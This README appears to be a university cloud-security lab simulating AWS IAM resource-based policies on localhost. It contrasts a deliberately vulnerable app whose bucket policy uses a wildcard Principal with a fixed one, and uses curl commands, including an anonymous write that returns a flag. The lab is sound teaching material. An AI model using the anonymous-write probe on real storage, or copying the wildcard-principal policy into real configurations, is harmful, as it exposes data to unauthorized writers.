# {{ slot_label }} — IAM Policy Evaluation (Privilege Escalation)

**Topic (source):** Shinya's own troubleshooting notes for AWS Academy Cloud Security
Foundations Lab 3.1 ("devuser can't download/upload; assuming BucketsAccessRole partially
fixes it; bucket3's resource policy is the real question"), described here in our own words —
**not** copied from any AWS Academy file. **Kind:** LAB.
**Concepts:** identity-based vs. resource-based IAM policies, policy evaluation order, least
privilege, wildcard `Principal` misconfiguration · **Analogous CWE:** CWE-284 (Improper Access
Control), CWE-668 (Exposure of Resource to Wrong Sphere).

## ✅ This lesson — what to do
1. **Before class** — Docker Desktop working; complete the real AWS Academy Lab 3.1 (*Using
   Resource-Based Policies to Secure an S3 Bucket*) in your Learner Lab sandbox first (that's
   still where you learn the actual AWS console UI).
2. **This add-on lab (60–90 min)** — a local, from-scratch simulation of the same IAM concept:
   a tiny "S3-and-IAM-like" API with a policy engine you can inspect and attack without an AWS
   account. Follow **Step-by-step** below (kickoff: `docker compose up -d --build`).
3. **Submit** — worksheet evidence and explanation → see [SUBMISSION.md](../../SUBMISSION.md).

## Objectives
- Explain why a caller with **no identity-based grant at all** can still access a resource,
  purely because of that resource's **own** resource-based policy.
- Identify a **wildcard `Principal`** in a resource policy as a privilege-escalation bug — it
  doesn't just grant "any role in this account," it grants **any caller, including one that
  never assumed a role.**
- Fix the bug by **scoping the resource policy's `Principal`** to the one legitimate role, and
  explain why that's an application of least privilege, not just "adding a check."

## 🪣 Signature exercise — "Assume the Wrong Role"
Two Flask targets, same endpoints, one resource-policy difference on `bucket3`:

| Service | Port | `bucket3` resource policy | Anonymous (no role assumed) can `PUT bucket3`? |
|---|---|---|---|
| `vulnerable_app.py` | `:8107` | `Principal: "*"`, actions `[get, put]` | **Yes** |
| `fixed_app.py` | `:8108` | `Principal: "BucketsAccessRole"`, actions `[get]` only | **No** |

**Why it's exciting:** you don't even need to steal credentials or assume a role — the bucket's
own policy hands write access to *anyone who asks*, no authentication required at all.

1. **Baseline:** `POST /assume-role {"role": "BucketsAccessRole"}` → token. Confirm this role
   can `PUT bucket2` (its resource policy explicitly allows it) but **cannot** `PUT bucket1`
   (bucket1's policy is get-only).
2. **The real question:** try `PUT /bucket/bucket3/object/<name>` **without any
   `Authorization` header at all** — no assumed role, no identity policy, nothing.
3. On `:8107` (vulnerable) this succeeds and returns the flag — the resource policy's
   `Principal: "*"` doesn't check *who* is calling.
4. **Confirm the fix:** the identical anonymous `PUT` against `:8108` (fixed) is rejected
   (`403`) — and so is the *same* `PUT` even from a legitimately-assumed `BucketsAccessRole`
   token, because the fixed bucket3 policy is get-only. That's the empirical proof that scoping
   `Principal` (not just "adding auth") is what closes the hole.

## Step-by-step (copy these commands)
**First, get this lab onto your computer.** You need your own copy of the course files. You download them once, then update them each
time. Open a terminal (Terminal on macOS or Linux, **Git Bash** on Windows) and do
A, B and C in order. You installed Git in the Week 01 setup; if `git` is "not found", do that
setup first.

A. **Download the course files (first time only).** Skip this if you already did it in Week 01.
   ```bash
   cd ~
   git clone https://github.com/nutthakorn7/cloud-infrastructure-security.git
   ```
   You should see `Cloning into 'cloud-infrastructure-security'...` and no error. If it says
   `already exists`, you have the files already: go on to B.

B. **Get the newest version (every time).** The course files change during the term, so do this
   even if you downloaded them last week. Your answers stay in Classroom; update the repo before each lab.
   ```bash
   cd ~/cloud-infrastructure-security
   git pull
   ```
   You should see `Already up to date.` or a list of changed files. If you see
   `No such file or directory`, your copy is in another folder: do A to make a new one here. If you
   see `Your local changes to the following files would be overwritten`, stop and ask the
   instructor for help syncing your copy. Do not discard your local changes blindly.

C. **Go into this lab's folder and check it.**
   ```bash
   cd {{ labpath }}
   ls
   ```
   You should see `README.md`, `worksheet.md` and `docker-compose.yml` among the files. Every
   command below runs from this folder. If you open a new terminal later, do B and C again first.

Run these in a terminal inside this lab folder: Terminal on macOS or Linux, or **Git Bash** on
Windows (it comes with Git). Each step says what you should see. Do them in order: a role token
works only on the app that gave it to you, and only until that app restarts.

0. **No private setup:** this public lab runs without a personal `.env` or an instructor message.
   The `flag` field is a shared demonstration marker, not proof of identity. Submit the complete
   request and vulnerable/fixed responses plus your explanation.

1. **Start both apps.** The first run downloads and builds the image, so it can take a few
   minutes.
   ```bash
   docker compose up -d --build
   ```
   When it finishes, wait about 10 seconds for the apps to start.
2. **Check that both apps are running.** If you see only `HTTP 000`, the apps are still starting:
   wait a few seconds and run the command again.
   ```bash
   curl -s -w 'HTTP %{http_code}\n' http://localhost:8107/ping
   curl -s -w 'HTTP %{http_code}\n' http://localhost:8108/ping
   ```
   You should see `{"mode":"vulnerable","status":"ok"}` and then `{"mode":"fixed","status":"ok"}`,
   each followed by `HTTP 200`.
3. **Assume `BucketsAccessRole` on the vulnerable app.** The first line saves the role's token in
   a shell variable called `TOKEN`; the second shows it.
   ```bash
   TOKEN=$(curl -s -X POST http://localhost:8107/assume-role -H 'Content-Type: application/json' -d '{"role": "BucketsAccessRole"}' | sed -E 's/.*"token":"([0-9a-f]+)".*/\1/')
   echo "$TOKEN"
   ```
   You should see a token of 32 letters and digits, such as `9976653199843e79ae27f7405440b034`
   (yours will be different). If it prints nothing, the app was not ready: run both lines again.
4. **Normal use: the role can write to bucket2**, because bucket2's resource policy allows it. The
   `Authorization` header is in double quotes on purpose, so the shell puts your token in.
   ```bash
   curl -s -w 'HTTP %{http_code}\n' -X PUT http://localhost:8107/bucket/bucket2/object/hello.txt -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"content": "hello"}'
   ```
   You should see `"principal":"BucketsAccessRole","status":"uploaded"` and `HTTP 200`.
5. **The role cannot write to bucket1**, because bucket1's resource policy allows reading only.
   ```bash
   curl -s -w 'HTTP %{http_code}\n' -X PUT http://localhost:8107/bucket/bucket1/object/hello.txt -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"content": "hello"}'
   ```
   You should see `{"bucket":"bucket1","error":"AccessDenied","principal":"BucketsAccessRole"}`
   and `HTTP 403`.
6. **The attack:** write to bucket3 on the vulnerable app with **no** `Authorization` header: no
   role, no token, nothing.
   ```bash
   curl -s -w 'HTTP %{http_code}\n' -X PUT http://localhost:8107/bucket/bucket3/object/note.txt -H 'Content-Type: application/json' -d '{"content": "anyone can write here"}'
   ```
   You should see `"principal":"anonymous"`, `"status":"uploaded"`, `"flag":"FLAG{...}"` and
   `HTTP 200`. Record the full response in the worksheet, together with the whole `curl`
   command you sent.
7. **The same attack on the fixed app:**
   ```bash
   curl -s -w 'HTTP %{http_code}\n' -X PUT http://localhost:8108/bucket/bucket3/object/note.txt -H 'Content-Type: application/json' -d '{"content": "anyone can write here"}'
   ```
   You should see `{"bucket":"bucket3","error":"AccessDenied","principal":"anonymous"}` and
   `HTTP 403`, with no flag.
8. **Even the real role cannot write to bucket3 on the fixed app**, because the fixed bucket3
   policy names only `BucketsAccessRole` and allows reading only. A token from step 3 works only on
   the vulnerable app, so get one from the fixed app first:
   ```bash
   TOKEN2=$(curl -s -X POST http://localhost:8108/assume-role -H 'Content-Type: application/json' -d '{"role": "BucketsAccessRole"}' | sed -E 's/.*"token":"([0-9a-f]+)".*/\1/')
   curl -s -w 'HTTP %{http_code}\n' -X PUT http://localhost:8108/bucket/bucket3/object/note.txt -H "Authorization: Bearer $TOKEN2" -H 'Content-Type: application/json' -d '{"content": "anyone can write here"}'
   ```
   You should see `{"bucket":"bucket3","error":"AccessDenied","principal":"BucketsAccessRole"}`
   and `HTTP 403`.
9. **Stop the apps when you finish.**
   ```bash
   docker compose down
   ```

If a step doesn't match, check that Docker Desktop is running and that you are in this lab folder,
then ask in class.

## Run it
```bash
cd {{ labpath }}
docker compose up -d --build  # vulnerable_app.py on :8107, fixed_app.py on :8108
python3 -m pip install requests          # once, on the host
python3 exploit.py
```
`exploit.py` runs the main checks in one go (an optional self-check, not a replacement for the
steps above; the Step-by-step needs no Python). Expect two `PASS` lines and exit `0`: an
anonymous write to bucket3 + flag on `:8107`, a rejected anonymous write (no flag) on `:8108`.

**Verified (2026-11-04):** The "get this lab" commands (A, B and C) were run as written on 2026-11-08, in bash and in zsh, on a fresh clone. `docker compose up -d --build` was run on this machine (macOS) and
every command in Step-by-step was run as written, in bash and in zsh (the macOS default shell).
Windows Git Bash was not tested. The optional environment override was tested; the public default is a shared marker. `exploit.py` then ran from the host against the published
ports. Real captured output, flag value masked:
```
=== VULNERABLE (bucket3 Principal = '*') (http://localhost:8107) ===
[*] BucketsAccessRole GET bucket1 (no such key yet) -> 404 {'error': 'NoSuchKey'}
[*] BucketsAccessRole PUT bucket2 (resource policy allows it) -> 200 {..., 'status': 'uploaded'}
[*] BucketsAccessRole PUT bucket3 (with role assumed)         -> 200 {..., 'flag': 'FLAG{...}'}
[*] anonymous (no role assumed) PUT bucket3                  -> 200 {..., 'flag': 'FLAG{...}'}
PASS: anonymous caller wrote to bucket3 on the vulnerable app, flag = FLAG{...}

=== FIXED (bucket3 scoped to BucketsAccessRole, get-only) (http://localhost:8108) ===
[*] BucketsAccessRole GET bucket1 (no such key yet) -> 404 {'error': 'NoSuchKey'}
[*] BucketsAccessRole PUT bucket2 (resource policy allows it) -> 200 {..., 'status': 'uploaded'}
[*] BucketsAccessRole PUT bucket3 (with role assumed)         -> 403 {'error': 'AccessDenied', ...}
[*] anonymous (no role assumed) PUT bucket3                  -> 403 {'error': 'AccessDenied', ...}
PASS: anonymous caller correctly REJECTED on the fixed app (403), no flag
```
Exit code `0`. Negative controls confirmed separately: `devuser`/anonymous callers get `403` on
`bucket1` (no matching resource or identity policy); an unknown bucket name returns `403`, not a
crash.

**Shared demonstration marker.** No personal `.env` or individual flag is required. Any
`flag` printed by this simulation is a public example marker; it does not identify the student
and is not graded by itself. Submit the exact request or command, the complete relevant
vulnerable and fixed responses, and your own explanation of the security effect. The instructor
may ask you to reproduce and explain the result live. Do not use real credentials in evidence.

## Deliverable
The complete vulnerable/fixed response evidence + the exact request (bucket, method, headers-or-lack-thereof) that produced
it + a one-paragraph explanation of why a wildcard `Principal` on a resource-based policy is
different from "no authentication" — it's not that auth is missing, it's that the policy
itself names everyone as authorized. You may answer in Thai or English. Write your answers on the
**Local06 Answer Sheet** copy in Classroom and click Turn in (no PDF needed). Full tasks:
`worksheet.md`.

## References
- AWS IAM documentation — *Identity-based policies and resource-based policies*, *Policy
  evaluation logic* (publicly available, general concept — no AWS Academy file used or copied).
- AWS S3 documentation — *Bucket policy examples*, specifically why `"Principal": "*"` should
  almost always be paired with a `Condition` block or avoided entirely.
